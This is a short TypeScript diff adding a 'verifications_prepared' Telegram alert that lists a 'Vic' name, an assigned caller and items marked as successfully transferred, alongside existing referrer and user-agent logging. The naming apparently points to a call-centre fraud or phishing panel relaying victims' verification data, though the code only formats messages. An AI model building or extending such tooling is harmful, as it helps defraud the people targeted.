@@ -18,6 +18,7 @@ export type TelegramEvent =
   | "todo_completed"
   | "todo_created"
   | "contact_request_received"
+  | "verifications_prepared"
   | "test";
 
 
@@ -143,6 +144,16 @@ function formatMessage(event: TelegramEvent, p: Payload): string {
         p.referrer ? `↩️ Referrer: ${esc(p.referrer)}` : null,
         p.userAgent ? `🖥️ UA: ${esc(p.userAgent)}` : null,
       ].filter(Boolean).join("\n");
+
+    case "verifications_prepared":
+      return [
+        `✅ <b>Verifikationen bereit</b>`,
+        `👤 Vic: ${esc(p.vic_name || "Unbekannt")}`,
+        `📞 Caller: ${esc(p.caller_name || "nicht zugewiesen")}`,
+        ``,
+        `<b>Erfolgreich übertragen:</b>`,
+        ...((p.items as string[]) ?? []).map((t) => `• ${esc(t)}`),
+      ].join("\n");
 
     case "chat_message_received":
       return [
